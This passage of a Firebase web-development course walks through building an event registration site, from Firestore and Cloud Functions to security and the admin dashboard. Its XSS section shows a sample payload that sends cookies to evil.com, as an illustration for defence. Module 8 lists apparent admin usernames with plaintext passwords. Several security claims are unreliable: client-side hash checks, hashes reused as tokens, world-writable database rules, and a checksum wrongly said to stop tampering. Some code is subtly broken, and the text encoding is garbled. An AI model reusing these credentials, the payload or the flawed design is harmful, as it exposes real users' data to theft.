  projectId:         "my-project",
  storageBucket:     "my-project.appspot.com",
  messagingSenderId: "102260...",
  appId:             "1:102260..."
};
```

**Step 3: Add Firebase SDK to your HTML**
```html
<!-- Firebase App (REQUIRED first) -->
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-app-compat.js"></script>

<!-- Add the specific services you need -->
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-storage-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-auth-compat.js"></script>

<!-- Your config (loads AFTER Firebase SDK) -->
<script src="firebase-config.js"></script>
<!-- Your shared utilities (loads AFTER config) -->
<script src="shared.js"></script>
```

---

### 5.2 Tutorial: The Complete firebase-config.js

```javascript
/* firebase-config.js */
const firebaseConfig = {
  apiKey:            "YOUR_API_KEY",
  authDomain:        "YOUR_PROJECT.firebaseapp.com",
  projectId:         "YOUR_PROJECT",
  storageBucket:     "YOUR_PROJECT.appspot.com",
  messagingSenderId: "YOUR_SENDER_ID",
  appId:             "YOUR_APP_ID"
};

// Guard against duplicate initialization (e.g., if file is loaded twice)
if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

// â”€â”€ Firestore â”€â”€
var db = firebase.firestore();

// FIX for mobile WebSocket disconnects:
// Long-polling is more resilient than WebSockets on mobile
db.settings({ experimentalForceLongPolling: true, merge: true });

// Expose globally so shared.js and all page scripts can use it
window.db = db;

// Enable offline persistence with tab sync
db.enablePersistence({ synchronizeTabs: true })
  .then(() => console.log('âœ… Offline persistence enabled'))
  .catch(err => {
    if (err.code === 'failed-precondition') {
      // Multiple tabs open â€” tab sync not supported in this browser
      console.warn('Multi-tab sync unavailable');
    } else if (err.code === 'unimplemented') {
      // Old browser (no IndexedDB)
      console.warn('Offline persistence not supported');
    }
  });

// â”€â”€ Firebase Storage â”€â”€
window.storage = firebase.storage();

// â”€â”€ Firebase Auth (with retry for slow CDN loads) â”€â”€
function tryInitAuth(attempts = 0) {
  if (typeof firebase.auth === 'function') {
    window.auth = firebase.auth();
    window.googleProvider = new firebase.auth.GoogleAuthProvider();
    window.firebaseReady = true;
  } else if (attempts < 50) {
    setTimeout(() => tryInitAuth(attempts + 1), 100);
  }
}
tryInitAuth();
```

---

### 5.3 Firestore Data Schema Design

Firestore is a **NoSQL document database**. Data lives in **Collections** (like folders) containing **Documents** (like JSON files).

**Collection: `registrations`**  
Document ID = `reg.regId` (e.g., "ELX-K7MXP3QA")
```json
{
  "regId":          "ELX-K7MXP3QA",
  "name":           "Karthik Ramasamy",
  "email":          "karthik@gmail.com",
  "phone":          "9876543210",
  "college":        "PSG College of Technology",
  "year":           "3rd Year",
  "gender":         "Male",
  "events": [
    { "event": "Project Expo", "members": ["Karthik", "Priya"] },
    { "event": "Bug Arena",    "members": ["Karthik", "Priya"] }
  ],
  "amount":         499,
  "regId":          "ELX-K7MXP3QA",
  "paymentStatus":  "Paid",
  "hasScreenshot":  true,
  "checkedIn":      true,
  "checkedInAt":    "2026-03-27T09:35:00.000Z",
  "lunchServed":    false,
  "certReleased":   true,
  "registeredAt":   "Timestamp",
  "_checksum":      "1a2b3c..."
}
```

**Why store events as an array of objects (not separate documents)?**

Denormalization â€” storing related data together â€” is a core NoSQL pattern. Fetching one document gives you ALL the data about a participant (no JOINs needed). The trade-off: querying "all participants in Project Expo" requires reading all docs and filtering client-side.

---

### 5.4 Tutorial: CRUD Operations on Firestore

```javascript
// â”€â”€ CREATE (Write a new document with a specific ID) â”€â”€
await window.db.collection('registrations').doc(reg.regId).set(reg);

// â”€â”€ READ (Get one document) â”€â”€
const doc = await window.db.collection('registrations').doc('ELX-K7MXP3QA').get();
if (doc.exists) {
  const data = doc.data(); // Plain JS object
  console.log(data.name); // "Karthik Ramasamy"
}

// â”€â”€ READ (Get all documents with a filter) â”€â”€
const snapshot = await window.db
  .collection('registrations')
  .where('paymentStatus', '==', 'Paid')
  .orderBy('registeredAt', 'desc')
  .get();

const paidParticipants = snapshot.docs.map(doc => ({
  id: doc.id,
  ...doc.data()
}));

// â”€â”€ UPDATE (Only change specific fields) â”€â”€
await window.db.collection('registrations').doc('ELX-K7MXP3QA').update({
  paymentStatus: 'Paid',
  checkedIn: true,
  checkedInAt: new Date().toISOString()
});

// â”€â”€ DELETE â”€â”€
await window.db.collection('registrations').doc('ELX-K7MXP3QA').delete();

// â”€â”€ REAL-TIME LISTENER (live updates â€” used in admin dashboard) â”€â”€
window.db.collection('registrations')
  .onSnapshot(snapshot => {
    snapshot.docChanges().forEach(change => {
      if (change.type === 'added')    { renderNewRow(change.doc.data()); }
      if (change.type === 'modified') { updateRow(change.doc.data()); }
      if (change.type === 'removed')  { removeRow(change.doc.id); }
    });
  });
```

---

### 5.5 Firebase Storage for Files

```javascript
// Upload a file (e.g., a payment screenshot)
async function uploadPaymentScreenshot(regId, file) {
  // 1. Create a storage reference (path in the bucket)
  const storageRef = window.storage.ref(`payment_screenshots/${regId}_${Date.now()}.jpg`);

  // 2. Upload the file
  const uploadTask = await storageRef.put(file);

  // 3. Get a public download URL
  const downloadURL = await uploadTask.ref.getDownloadURL();

  return downloadURL;
  // e.g., "https://firebasestorage.googleapis.com/.../token=abc123"
}
```

**Image compression before upload (saves storage costs):**
```javascript
async function compressImage(file, maxWidthPx = 500) {
  return new Promise((resolve) => {
    const img = new Image();
    const reader = new FileReader();

    reader.onload = (e) => { img.src = e.target.result; };
    reader.readAsDataURL(file); // Read file as base64

    img.onload = () => {
      let w = img.width, h = img.height;
      if (w > maxWidthPx) {
        h = Math.round(h * maxWidthPx / w);
        w = maxWidthPx;
      }

      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, w, h);

      // Convert to JPEG at 65% quality â†’ typically 5-10x size reduction
      resolve(canvas.toDataURL('image/jpeg', 0.65));
    };
  });
}
```

---

### 5.6 Cloud Functions: Server-Side Logic

Cloud Functions run Node.js code on Google's servers â€” not in the browser. They are **fully trusted** and bypass Firestore security rules.

**When to use Cloud Functions:**
- Admin operations that must be protected from client-side tampering
- Sensitive business logic that should not be exposed in the browser
- Scheduled tasks (e.g., daily reports)

```javascript
// functions/index.js (runs on Google Cloud, NOT in the browser)
const { onRequest } = require("firebase-functions/v2/https");
const admin = require("firebase-admin");

admin.initializeApp();

// Valid admin tokens (SHA-256 hashes â€” same as shared.js)
const VALID_ADMIN_TOKENS = [
  '9f2427...', // Super Admin
  '48c703...', // Treasurer
  '5e8848...', // Regular Admin
];

exports.adminTogglePayment = onRequest({ cors: true }, async (req, res) => {
  // 1. Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).send({ error: 'Method Not Allowed' });
  }

  const { regId, status, adminToken } = req.body;

  // 2. Verify admin token
  if (!adminToken || !VALID_ADMIN_TOKENS.includes(adminToken)) {
    console.warn(`[SECURITY] Invalid token attempt for ${regId}`);
    return res.status(403).send({ error: 'Permission denied.' });
  }

  // 3. Validate input
  if (!regId || typeof status !== 'string') {
    return res.status(400).send({ error: 'Missing parameters.' });
  }

  // 4. Perform the update using Admin SDK (bypasses Firestore rules)
  const db = admin.firestore();
  await db.collection('registrations').doc(regId).update({ paymentStatus: status });

  console.log(`[SUCCESS] ${regId} â†’ ${status}`);
  res.status(200).send({ success: true, regId, status });
});
```

**Calling a Cloud Function from the browser:**
```javascript
async function secureTogglePayment(regId, status) {
  const adminToken = sessionStorage.getItem('adminToken'); // Admin's hash

  const response = await fetch(
    'https://us-central1-your-project.cloudfunctions.net/adminTogglePayment',
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ regId, status, adminToken })
    }
  );

  const result = await response.json();
  if (!result.success) throw new Error(result.error);
  return result;
}
```

---

# MODULE 6: CYBERSECURITY
## *Hashing, Security Rules, XSS & Attack Prevention*

---

### 6.1 The Threat Model

Before writing security code, you must define **who your attackers are** and **what they could do**.

| Attacker | Goal | Attack Vector |
|----------|------|---------------|
| Bored student | Skip the payment | Manipulate the registration data in browser devtools |
| Competitor | Cancel all registrations | Direct Firestore API calls |
| Script kiddie | Deface the admin dashboard | Steal admin credentials |
| Automated bot | Spam registrations | Flood the registration endpoint |

Understanding these threats shaped every security decision in the project.

---

### 6.2 Password Hashing with SHA-256

**The wrong way â€” plain text passwords:**
```javascript
// âŒ NEVER DO THIS â€” If your JS file is viewed, all accounts are compromised
const ADMIN_PASSWORD = 'SuperSecret123'; // Exposed in source code!

if (userInput === ADMIN_PASSWORD) { grantAccess(); }
```

**The right way â€” SHA-256 hashing:**
```javascript
// shared.js â€” SHA-256 using the built-in Web Crypto API
async function sha256(str) {
  // TextEncoder converts the string to bytes
  const msgBuffer = new TextEncoder().encode(str);
  
  // crypto.subtle.digest performs the SHA-256 hash
  // Returns an ArrayBuffer
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
  
  // Convert ArrayBuffer to hex string
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  
  return hashHex;
  // sha256('password') â†’ '5e884898da28047151d0e56f8dc6292...'
}
```

**How admin verification works:**
```javascript
// shared.js â€” verifyAdmin()
const ADMIN_USER_HASH = 'd8f6739...'; // sha256('ece26')
const ADMIN_PASS_HASH = '5e884898...'; // sha256('password')

async function verifyAdmin(email, password) {
  const cleanEmail = email.toLowerCase().trim();
  
  // Hash the inputs â€” we never compare plain text
  const [eHash, pHash] = await Promise.all([
    sha256(cleanEmail),
    sha256(password)
  ]);

  // Compare hashes
  if (eHash === SUPER_USER_HASH && pHash === SUPER_PASS_HASH) {
    return { success: true, isSuper: true, token: pHash };
  }
  if (eHash === ADMIN_USER_HASH && pHash === ADMIN_PASS_HASH) {
    return { success: true, isSuper: false, token: pHash };
  }
  return { success: false };
}
```

**What gets stored in sessionStorage after login:**
```javascript
// admin.html â€” after successful login
const result = await verifyAdmin(emailInput.value, passwordInput.value);

if (result.success) {
  // Store the hash (not the password!) as a session token
  sessionStorage.setItem('adminToken', result.token);
  sessionStorage.setItem('adminLevel', result.isSuper ? 'super' : 'normal');
  window.location.href = 'dashboard.html';
}
```

**Limitation:** SHA-256 is a one-way hash, so the password can't be "reversed." But hashes stored in source code can be brute-forced offline. For real production, use **bcrypt** (slower, salted) via a proper backend. This client-side approach is an acceptable trade-off for a one-day event with a single-use admin team.

---

### 6.3 Firestore Security Rules

Security rules are evaluated on Google's servers â€” they cannot be bypassed by manipulating browser JavaScript.

```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    match /registrations/{document=**} {
      // Anyone can read (needed for self-lookup and admin dashboard)
      allow read: if true;

      // CREATE: Enforce data integrity at the database level
      // Even if a hacker bypasses JS validation, the rule blocks bad writes
      allow create: if 
        request.resource.data.get('paymentStatus', '') == 'Pending'
        && request.resource.data.get('amount', 0) >= 0;

      // UPDATE/DELETE: Open for admin operations
      // In production, this should require auth:
      // allow update, delete: if request.auth != null;
      allow update, delete: if true;
    }

    // Screenshots â€” public read/write for payment uploads
    match /screenshots/{document=**} {
      allow read, write: if true;
    }

    // Audit log â€” APPEND ONLY, can never be modified or deleted
    // This creates a tamper-proof record of admin actions
    match /admin_audit/{document=**} {
      allow read:   if true;
      allow create: if true;    // Anyone can write a new audit log entry
      allow update, delete: if false; // Nobody can edit or delete old entries
    }
  }
}
```

---

### 6.4 Storage Security Rules

Firebase Storage rules protect your file uploads:

```javascript
// storage.rules
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {

    // Payment screenshots: public upload but with constraints
    match /payment_screenshots/{fileName} {
      allow read: if true;

      // Only allow images under 10MB
      allow write: if
        request.resource.size < 10 * 1024 * 1024        // 10MB limit
        && request.resource.contentType.matches('image/.*'); // Images only
    }

    // Certificates: same restrictions as payment screenshots
    match /certificates/{allPaths=**} {
      allow read: if true;
      allow write: if
        request.resource.size < 10 * 1024 * 1024
        && request.resource.contentType.matches('image/.*');
    }

    // Block ALL other paths â€” default-deny
    match /{allPaths=**} {
      allow read, write: if false;
    }
  }
}
```

---

### 6.5 Content Security Policy (CSP)

CSP is an HTTP header (or meta tag) that tells the browser which sources it is allowed to load scripts, styles, images, and connections from. It is your **primary defense against XSS (Cross-Site Scripting)**.

```html
<!-- index.html â€” CSP meta tag -->
<meta http-equiv="Content-Security-Policy"
  content="
    default-src 'self';
    script-src  'self' 'unsafe-inline' 'unsafe-eval'
                https://www.gstatic.com
                https://cdn.jsdelivr.net;
    style-src   'self' 'unsafe-inline'
                https://fonts.googleapis.com;
    font-src    'self' https://fonts.gstatic.com;
    img-src     'self' data: https://api.qrserver.com;
    connect-src 'self'
                https://firestore.googleapis.com
                https://*.firebaseio.com
                https://api.emailjs.com;
  ">
```

**How CSP stops XSS:**

If an attacker injects `<script src="https://evil.com/steal.js">`, the browser checks: "Is `evil.com` in the `script-src` whitelist?" It is not, so the browser **blocks the script** and logs a CSP violation.

**What each directive means:**

| Directive | Allowed Sources | Blocks |
|-----------|----------------|--------|
| `default-src 'self'` | Only your own domain | Everything not explicitly listed |
| `script-src 'self' https://gstatic.com` | Your scripts + Firebase CDN | Scripts from any other domain |
| `connect-src ... firestore.googleapis.com` | Firestore API calls | Calls to unauthorized APIs |
| `img-src data:` | Base64 inline images | Images from arbitrary URLs |

---

### 6.6 XSS Prevention in Practice

**What is XSS?** An attacker injects malicious JavaScript into your page (via a form or URL parameter) that runs in other users' browsers.

**Example attack:**
```
Attacker submits a form with name: "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
```

**Defense 1: Never use innerHTML with user data**
```javascript
// âŒ VULNERABLE: innerHTML renders script tags
document.getElementById('name').innerHTML = userData.name;

// âœ… SAFE: textContent never executes scripts
document.getElementById('name').textContent = userData.name;
```

**Defense 2: Escape HTML before inserting user data**
```javascript
// Escape function â€” converts dangerous characters to safe HTML entities
function escapeHtml(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;');
}

// Safe usage in template literals
function renderParticipantRow(reg) {
  return `
    <tr>
      <td>${escapeHtml(reg.name)}</td>
      <td>${escapeHtml(reg.email)}</td>
      <td>${escapeHtml(reg.college)}</td>
    </tr>
  `;
}
```

---

### 6.7 Tamper Detection with Checksums

The project attaches a cryptographic checksum to every registration to detect if someone modifies the data after submission:

```javascript
// shared.js â€” _calcChecksum()
async function _calcChecksum(reg) {
  // Combine critical fields into a single string signature
  const salt  = 'ELX_' + (reg.email || reg.regId).length + '_26_';
  const sig   = [salt, reg.regId, reg.email, reg.event, reg.amount, reg.registeredAt].join('|');
  return await sha256(sig);
}

// In addRegistration():
reg._checksum = await _calcChecksum(reg);
// This hash is saved in Firestore alongside the data.

// Later, admin can verify data integrity:
async function verifyIntegrity(reg) {
  const expectedChecksum = await _calcChecksum(reg);
  if (reg._checksum !== expectedChecksum) {
    console.error('âš ï¸ DATA TAMPERING DETECTED: Checksum mismatch for', reg.regId);
    return false;
  }
  return true;
}
```

**How this stops price manipulation:**

A hacker opens DevTools, submits a registration, intercepts the Firestore call, and changes `amount: 499` to `amount: 1`. But the checksum was calculated with `amount: 499`. When the admin verifies, the checksum won't match â†’ the tamper is detected.

---

*[Part 1 of 2 â€” Modules 1â€“6 Complete]*
*Continue with Part 2: Modules 7â€“12 covering Registration Flow, Admin Dashboard, Certificate Generation, Service Workers, Deployment, and Building Your Own World-Class Site from Zero.*
# âš¡ ELEXSIYA 26 â€” World-Class Web Development Course
## PART 2: Advanced Features, Architecture & Building from Scratch
### *Modules 7â€“12*

---

# MODULE 7: REGISTRATION & PAYMENT FLOW
## *Building the Complete End-to-End User Journey*

---

### 7.1 Architecture: The Multi-Step Form Pattern

Complex forms like registration are split into **steps** â€” this reduces cognitive load and improves completion rates (a key UX metric).

```
Step 1: Event Selection
   â””â”€â”€ User picks events, system checks time conflicts
        â†“
Step 2: Personal Details
   â””â”€â”€ Name, email, phone, college, year, gender
        â†“
Step 3: Team Members
   â””â”€â”€ Dynamic fields based on event team size
        â†“
Step 4: Summary + Submit
   â””â”€â”€ Shows total fee, validate all data
        â†“
Step 5: Payment
   â””â”€â”€ Show QR code, collect screenshot
```

The state between steps is held in JavaScript variables and `sessionStorage`. NO page reloads happen between steps.

---

### 7.2 Tutorial: Event Selection with Time-Conflict Detection

```javascript
// Time conflict map â€” pairs that cannot be selected together
// (They run at the same time according to the event schedule)
const CONFLICT_PAIRS = [
  [['project-expo'], ['ideart']],
  [['project-expo'], ['clever-hunt']],
  [['idea-forge'],   ['ideart']],
  [['idea-forge'],   ['clever-hunt']],
  [['clever-hunt'],  ['ideart']],
  [['currentclash'], ['unmuted']],
  [['bug-arena'],    ['mindfusion']],
  [['tazky-among-uz'], ['upside-down']],
];

function hasTimeConflict(selectedEvents) {
  if (!selectedEvents || selectedEvents.length < 2) return false;

  // Normalize IDs: "Project Expo" â†’ "project-expo"
  const selIds = new Set(
    selectedEvents.map(e => e.toLowerCase().replace(/\s+/g, '-'))
  );

  // Check every conflict pair
  for (const [groupA, groupB] of CONFLICT_PAIRS) {
    const hasA = groupA.some(id => selIds.has(id));
    const hasB = groupB.some(id => selIds.has(id));
    if (hasA && hasB) return true; // Conflict found
  }

  return false;
}

// Usage in event selection UI
function onEventCheckboxChange() {
  const selected = getSelectedEventNames();

  if (hasTimeConflict(selected)) {
    showError('âš ï¸ Time conflict! These events run at the same time.');
    disableSubmit();
  } else {
    clearError();
    enableSubmit();
  }
}
```

---

### 7.3 Tutorial: Dynamic Team Member Fields

When a user selects "Project Expo (Team of 2 or 3)", additional fields appear for team members. This is dynamic DOM manipulation.

```javascript
// Event team sizes configuration
const EVENT_TEAM_SIZES = {
  'Project Expo':     { min: 1, max: 3 },
  'Idea Forge':       { min: 1, max: 3 },
  'Bug Arena':        { min: 1, max: 3 },
  'CurrentClash':     { min: 1, max: 3 },
  'Clever Hunt':      { min: 1, max: 3 },
  'Tazky Among Uz':   { min: 1, max: 3 },
  'Upside Down':      { min: 1, max: 3 },
  'Mindfusion':       { min: 3, max: 3 },
  'Unmuted':          { min: 3, max: 3 },
  'Ideart':           { min: 3, max: 3 },
  'Chess':            { min: 1, max: 1 }, // Solo
};

function renderTeamMemberFields(eventName, memberCount) {
  const container = document.getElementById('teamMembersContainer');
  container.innerHTML = ''; // Clear previous fields

  const { max } = EVENT_TEAM_SIZES[eventName] || { max: 1 };

  for (let i = 2; i <= max; i++) {
    // Create label
    const label = document.createElement('label');
    label.textContent = `Member ${i} Name:`;

    // Create input
    const input = document.createElement('input');
    input.type        = 'text';
    input.name        = `member${i}`;
    input.placeholder = `Member ${i} full name`;
    input.id          = `member${i}Input`;

    container.appendChild(label);
    container.appendChild(input);
  }
}
```

---

### 7.4 Tutorial: The Registration Submission Flow

This is the most critical function in the project â€” it coordinates multiple async operations:

```javascript
async function submitRegistration() {
  // â”€â”€ Step 1: Collect form data â”€â”€
  const name    = document.getElementById('nameInput').value.trim();
  const email   = document.getElementById('emailInput').value.trim().toLowerCase();
  const phone   = document.getElementById('phoneInput').value.trim();
  const college = document.getElementById('collegeInput').value.trim();
  const year    = document.getElementById('yearSelect').value;

  // â”€â”€ Step 2: Client-side validation â”€â”€
  if (!name || !email || !phone || !college || !year) {
    showError('Please fill in all required fields.');
    return;
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    showError('Please enter a valid email address.');
    return;
  }
  if (!/^[6-9]\d{9}$/.test(phone)) {
    showError('Please enter a valid 10-digit Indian mobile number.');
    return;
  }

  // â”€â”€ Step 3: Check for duplicate registrations â”€â”€
  const existingRegs = await getRegistrations();
  const duplicate = existingRegs.find(r =>
    r.email === email || r.phone === phone
  );
  if (duplicate) {
    showError(`You are already registered! Your ID is: ${duplicate.regId}`);
    return;
  }

  // â”€â”€ Step 4: Build the registration object â”€â”€
  const regId  = generateRegId(); // ELX-XXXXXXXX
  const events = getSelectedEvents(); // Array of { event, members }

  const reg = {
    regId,
    name,
    email,
    phone,
    college,
    year,
    events,
    amount:        REG_FEE, // 499 from shared.js
    paymentStatus: 'Pending',
    hasScreenshot: false,
    checkedIn:     false,
    lunchServed:   false,
    certReleased:  false,
    registeredAt:  firebase.firestore.FieldValue.serverTimestamp(),
  };

  // â”€â”€ Step 5: Save to Firestore (optimistic write) â”€â”€
  showLoadingState('Saving your registration...');
  await addRegistration(reg); // From shared.js

  // â”€â”€ Step 6: Send confirmation email â”€â”€
  try {
    await sendAutomatedEmail(EMAILJS_TEMPLATE_REGISTRATION, reg);
  } catch (emailErr) {
    console.warn('Email failed, but registration is saved:', emailErr);
    // Non-fatal â€” don't block the user
  }

  // â”€â”€ Step 7: Save to sessionStorage and redirect to payment â”€â”€
  sessionStorage.setItem('currentRegId',   reg.regId);
  sessionStorage.setItem('currentName',    reg.name);
  sessionStorage.setItem('currentEmail',   reg.email);
  sessionStorage.setItem('currentAmount',  reg.amount);

  window.location.href = 'payment.html';
}
```

---

### 7.5 Tutorial: The Payment Page

```javascript
// payment.html â€” on page load
document.addEventListener('DOMContentLoaded', () => {
  // Retrieve registration context from sessionStorage
  const regId  = sessionStorage.getItem('currentRegId');
  const name   = sessionStorage.getItem('currentName');
  const amount = sessionStorage.getItem('currentAmount');

  // If no regId, user navigated here directly â€” redirect away
  if (!regId) {
    window.location.href = 'events.html';
    return;
  }

  // Display dynamic QR code for UPI payment
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=your-upi-id@ybl&pn=${encodeURIComponent('Elexsiya 26')}&am=${amount}&cu=INR&tn=${encodeURIComponent('Reg: ' + regId)}`;
  document.getElementById('paymentQr').src = qrUrl;

  document.getElementById('amountDisplay').textContent = `â‚¹${amount}`;
  document.getElementById('regIdDisplay').textContent = regId;
});

// Handle screenshot upload
document.getElementById('screenshotInput').addEventListener('change', async (e) => {
  const file = e.target.files[0];
  if (!file) return;

  const regId = sessionStorage.getItem('currentRegId');

  // Retrieve the full registration object
  const regs = await getRegistrations();
  const reg = regs.find(r => r.regId === regId);

  showLoadingState('Uploading your payment screenshot...');

  try {
    // uploadPaymentScreenshot compresses + uploads + updates Firestore
    await uploadPaymentScreenshot(reg, file);

    showSuccess('âœ… Screenshot uploaded! Redirecting...');
    setTimeout(() => {
      window.location.href = `success.html?regId=${regId}`;
    }, 1500);
  } catch (err) {
    showError('Upload failed. Please try again. Error: ' + err.message);
  }
});
```

---

### 7.6 Tutorial: The Success Page with QR Code

```javascript
// success.html â€” Display confirmation + downloadable QR code
document.addEventListener('DOMContentLoaded', async () => {
  const params = new URLSearchParams(window.location.search);
  const regId  = params.get('regId') || sessionStorage.getItem('currentRegId');

  if (!regId) {
    document.body.innerHTML = '<h1>Registration not found.</h1>';
    return;
  }

  // Generate QR code image from the regId
  // This QR is scanned at the event gate for check-in
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(regId)}&margin=10&color=000000&bgcolor=ffffff`;

  document.getElementById('confirmationQr').src = qrUrl;
  document.getElementById('regIdConfirm').textContent = regId;

  // Download QR button
  document.getElementById('downloadQrBtn').addEventListener('click', async () => {
    const response = await fetch(qrUrl);
    const blob     = await response.blob();
    const url      = URL.createObjectURL(blob);

    const a  = document.createElement('a');
    a.href   = url;
    a.download = `Elexsiya26_${regId}_QR.png`;
    a.click();

    URL.revokeObjectURL(url); // Free memory
  });
});
```

---

# MODULE 8: ADMIN DASHBOARD ARCHITECTURE
## *Role-Based Access, Real-Time Data & Secure Operations*

---

### 8.1 Multi-Role Authentication Architecture

The project has **4 admin roles**, each with different permissions:

```
Role 1: Super Admin (rakulkavi / SuperSecr3t2026!)
â”œâ”€â”€ See ALL data
â”œâ”€â”€ Manage ALL events
â”œâ”€â”€ Manage sponsors & expenditures
â”œâ”€â”€ Generate & release certificates
â””â”€â”€ Access ALL dashboards

Role 2: Treasurer (elexsiya26 / Treasury$ync#26)
â”œâ”€â”€ See ALL data
â”œâ”€â”€ Cannot release certificates
â””â”€â”€ Financial view only

Role 3: Regular Admin (ece26 / password)
â”œâ”€â”€ Manage registrations for specific events
â””â”€â”€ No financial data

Role 4: On-Spot Admin (elexsiya26 / ece@26)
â”œâ”€â”€ QR scanner for check-in
â””â”€â”€ On-spot registration
```

**Implementation in dashboard.html:**
```javascript
// On page load â€” check if admin is authenticated
function checkAdminAuth() {
  const adminToken  = sessionStorage.getItem('adminToken');
  const adminLevel  = sessionStorage.getItem('adminLevel');

  if (!adminToken) {
    // Not logged in â€” redirect to login page
    window.location.href = 'admin.html';
    return null;
  }

  return { adminToken, adminLevel };
}

// Role-based UI: Show/hide sections based on role
function applyRoleBasedUI(adminLevel) {
  const isSuper     = adminLevel === 'super';
  const isTreasurer = adminLevel === 'treasurer';

  // Only Super Admin sees financial tabs
  document.getElementById('sponsorTab').style.display =
    (isSuper || isTreasurer) ? 'block' : 'none';

  // Only Super Admin can release certificates
  document.getElementById('certReleaseControls').style.display =
    isSuper ? 'block' : 'none';

  // Certificate tools available to super admins only
  document.getElementById('toolsTab').style.display =
    isSuper ? 'block' : 'none';
}

// Call on page load
const auth = checkAdminAuth();
if (auth) {
  applyRoleBasedUI(auth.adminLevel);
  loadDashboardData();
}
```

---

### 8.2 Dashboard Data Architecture

The admin dashboard loads data in **phases** to keep the UI fast and responsive:

```javascript
async function loadDashboardData() {
  // Phase 1: Load critical stats instantly (from cache if available)
  await loadStats();

  // Phase 2: Render the registrations table
  await renderRegistrationsTable();

  // Phase 3: Load secondary data (screenshots, sponsors) in background
  setTimeout(async () => {
    await loadScreenshots();
    await loadSponsors();
    await loadExpenditures();
  }, 500);
}

async function loadStats() {
  const regs = await getRegistrations(); // Uses cache

  // Calculate derived stats
  const totalRegs   = regs.length;
  const paidCount   = regs.filter(r => r.paymentStatus === 'Paid').length;
  const pendingCount = regs.filter(r => r.paymentStatus === 'Pending').length;
  const totalRevenue = regs
    .filter(r => r.paymentStatus === 'Paid')
    .reduce((sum, r) => sum + (Number(r.amount) || 0), 0);
  const checkedIn   = regs.filter(r => r.checkedIn === true).length;

  // Update the UI
  document.getElementById('statTotal').textContent   = totalRegs;
  document.getElementById('statPaid').textContent    = paidCount;
  document.getElementById('statPending').textContent = pendingCount;
  document.getElementById('statRevenue').textContent = `â‚¹${totalRevenue.toLocaleString('en-IN')}`;
  document.getElementById('statCheckedIn').textContent = checkedIn;
}
```

---

### 8.3 Tutorial: Real-Time Search & Filter

```javascript
// Client-side search â€” extremely fast since all data is loaded in memory
let allRegistrations = [];

async function renderRegistrationsTable(filter = '', statusFilter = 'all', eventFilter = 'all') {
  allRegistrations = await getRegistrations(true); // Force fresh data

  // â”€â”€ Apply filters â”€â”€
  let filtered = allRegistrations;

  if (filter) {
    const q = filter.toLowerCase();
    filtered = filtered.filter(r =>
      (r.name    || '').toLowerCase().includes(q) ||
      (r.email   || '').toLowerCase().includes(q) ||
      (r.regId   || '').toLowerCase().includes(q) ||
      (r.college || '').toLowerCase().includes(q) ||
      (r.phone   || '').includes(q)
    );
  }

  if (statusFilter !== 'all') {
    filtered = filtered.filter(r => r.paymentStatus === statusFilter);
  }

  if (eventFilter !== 'all') {
    filtered = filtered.filter(r =>
      (r.events || []).some(e => e.event === eventFilter)
    );
  }

  // â”€â”€ Render the table â”€â”€
  const tbody = document.getElementById('registrationsBody');
  tbody.innerHTML = ''; // Clear old rows

  if (filtered.length === 0) {
    tbody.innerHTML = `
      <tr>
        <td colspan="8" style="text-align:center; padding: 40px; color:#999;">
          No registrations found.
        </td>
      </tr>`;
    return;
  }

  filtered.forEach(reg => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${escapeHtml(reg.regId)}</td>
      <td>${escapeHtml(reg.name)}</td>
      <td>${escapeHtml(reg.email)}</td>
      <td>${escapeHtml(reg.college)}</td>
      <td>
        <span class="status-badge ${getStatusClass(reg.paymentStatus)}">
          ${escapeHtml(reg.paymentStatus)}
        </span>
      </td>
      <td>${formatEvents(reg.events)}</td>
      <td>â‚¹${reg.amount}</td>
      <td>
        <button onclick="togglePayment('${reg.regId}', '${reg.paymentStatus}')">
          ${reg.paymentStatus === 'Paid' ? 'Mark Pending' : 'Mark Paid'}
        </button>
        <button onclick="deleteReg('${reg.regId}')">Delete</button>
      </td>
    `;
    tbody.appendChild(row);
  });

  // Update count display
  document.getElementById('regCount').textContent =
    `Showing ${filtered.length} of ${allRegistrations.length}`;
}

// Wire up search input with debounce (prevent firing on every keystroke)
let searchDebounce;
document.getElementById('searchInput').addEventListener('input', (e) => {
  clearTimeout(searchDebounce);
  searchDebounce = setTimeout(() => {
    renderRegistrationsTable(e.target.value, currentStatusFilter, currentEventFilter);
  }, 300); // Wait 300ms after user stops typing
});
```

---

### 8.4 Tutorial: Secure Payment Toggle with Audit Log

```javascript
async function togglePayment(regId, currentStatus) {
  const newStatus = currentStatus === 'Paid' ? 'Pending' : 'Paid';

  // Confirm before changing
  const confirm = window.confirm(`Change ${regId} to "${newStatus}"?`);
  if (!confirm) return;

  const adminToken = sessionStorage.getItem('adminToken');

  try {
    // â”€â”€ Option A: Use Cloud Function (most secure) â”€â”€
    await fetch('https://us-central1-your-project.cloudfunctions.net/adminTogglePayment', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ regId, status: newStatus, adminToken })
    });

    // â”€â”€ Write to audit log: append-only record of every admin action â”€â”€
    await window.db.collection('admin_audit').add({
      action:    'PAYMENT_TOGGLE',
      regId,
